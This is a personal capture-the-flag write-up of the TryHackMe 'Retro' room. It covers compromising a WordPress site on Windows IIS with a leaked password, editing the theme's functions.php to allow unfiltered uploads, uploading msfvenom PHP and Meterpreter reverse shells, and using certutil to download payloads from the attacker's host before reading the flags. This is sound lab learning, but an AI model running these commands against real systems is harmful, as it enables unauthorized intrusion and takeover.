## TryHackMe - Retro
> Completed 2nd December  2022.

An easier box (rated hard) to to get me back into pace after a long break.

---
### Environment
#### Operating System
- Latest kali-VM rolling update

#### Tools
- nmap
- Gobuster
- Msfvenom
- Metasploit

---
### Methodology
#### Objectives/Flags
1. What is the hidden directory which the website lives on?
2. user.txt
3. root.txt

---
#### Reconnaissance
Started off by running an `nmap` scan of the target host.
```bash
nmap -T4 -sV <TargetIP>
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
We can see a http webserver running along with a terminal service which is Windows RDP. We can determine from these services that the machine hosts a Windows operating system.

By visiting the IP address on a web browser, we don't find an accessible page. I start to utilise `Gobuster`.
```bash
gobuster dir --url http://<TargetIP>/ -w <Wordlist> > <Output.txt> -t 100 --timeout 20s
```
From my first attempt at finding a directory, there was no luck based on the wordlist I had originally used which is my go-to directory wordlist `httparchive_directories_1m_2021_04_28.txt` which can be found [here](https://wordlists.assetnote.io/). Out of curiosity I appended 'retro' to the end of the URL which landed me on the target's homepage. This was kind of cheating as I knew the name of the box however in future, if I was to have run a scan for directories using an English dictionary, I would have been successful at finding the homepage. After rerunning `Gobuster` on the homepage, I found plenty of hits.

The website is a wordpress based and has article content created by the user 'Wade'. Immediately I went to work trying to XSS the comments box of one of the articles. I spent some time going down a rabbit hole of trying to bypass the filter that the page uses however after giving up and continuing my reconnaissance I found some data that would prove to be useful.

```
http://<TargetIP>/retro/index.php/2019/12/09/ready-player-one/
  I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down.
  
  Leaving myself a note here just in case I forget how to spell it: parzival
```

The website article and comment referenced to the main character of Ready-player-one, Wade Parzival. With this information I attempted to log into the Wordpress admin console.
```
http://10.10.232.64/retro/wp-admin/
  username: wade
  password: parzival
```
With that, I logged in successfully. 

#### Weaponization 
N/A

#### Delivery
Based on previous boxes like SimpleCTF, I jumped over the the media upload page where I had planned to upload a reverse shell. It turned out that file formats were filtered, and more work was needed before I proceed. I spent some time investigating the site and went to google with the filter error and Wordpress version.
```
Wordpress 5.2.1 Sorry, this file type is not permitted for security reasons. 
```
After some research it was suggested that the site's php files could be modified to allow for restricted filetypes by using the following php snippet.
```php
define( 'ALLOW_UNFILTERED_UPLOADS', true );
```
This was achieved by access the WordPress theme editor and inserting the code at the very end
```
http://<TargetIP>/retro/wp-admin/theme-editor.php?file=functions.php&theme=90s-retro
```
With the .php udated I could now upload restricted file types. I got to work preparing a php reverse shell as I knew the webserver would be able to serve this.
```bash
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```
The file was uploaded, and the console provided a URL at which the file could be accessed. A listener was readied before I ran the code.
```bash
nc -nlvp 1234
```

#### Exploitation
When I accessed the URL to fire of the shell, I established a foothold into the target host's web service account.
```
http://<TargetIP>/retro/wp-content/uploads/2022/12/shell.php
```
```bash
whoami
  nt authority\iusr
```
I was ready to move onto the next phase.

#### Installation 
N/A

#### Command & Control
N/A

#### Actions on Objective
I kept my eye out for clues while in search of loot
```
more index.php
<?php
// Silence is golden
```
```bash
dir C:/Users
12/08/2019  11:10 PM    <DIR>          Administrator
09/12/2016  03:37 AM    <DIR>          Public
12/08/2019  04:33 PM    <DIR>          Wade
```
The Wade and Administrator user files weren't accessible from the service account. I needed to escalate my privileges. I tried to infiltrate WinPeas.bat into the target host using `certutil` however the shell would hang when trying to run the .bat file.
```bash
certutil.exe -urlcache -f http:/<TargetIP>:4443/vuln-scan/winPEAS.bat win.bat
  win.bat
```
At this point I figured a meterpreter shell was going to be more stable, so I prepped a new shell and listener.
```bash
msdfvenom -p windows/meterpreter/reverse_tcp LHOST=<AttackIP> LPORT=1235 -f exe -o meterpreter-shell.exe
```
Using the existing shell I ran the certutil command learned from previous lab to infiltrate the shell file onto the target.
```bash
certutil.exe -urlcache -f http://10.4.1.220:4443/windows-tools/rshell/meterpreter-shell.exe mshell.exe
mshell.exe
```
The shell ran successfully, and I was ready to start looting data.
```bash
cd C:\Users\Wade\Desktop
cat user.txt.txt
  {flag}
cd C:\Users\Administrator\Desktop

cat root.txt.txt
  {flag}
```

---
### After-action
#### What I've learned
I need to try more word listing techniques attempting to fuzz web directories.

#### What I would've done differently
N/A